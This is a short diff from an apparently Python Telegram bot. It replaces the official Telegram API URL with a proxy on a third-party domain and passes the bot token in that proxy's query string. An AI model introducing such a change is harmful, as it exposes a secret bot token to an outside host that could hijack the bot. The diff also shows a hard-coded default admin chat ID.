@@ -11,7 +11,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(mess
 logger = logging.getLogger(__name__)
 
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
-TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
+TELEGRAM_API = f'https://investorbabu.com/api/telegram-proxy?path=bot{TELEGRAM_BOT_TOKEN}'
 HISTORY_FILE = 'telegram_history.json'
 
 ADMIN_IDS = [id.strip() for id in os.getenv('TELEGRAM_ADMIN_CHAT_ID', '945073334').split(',') if id.strip()]
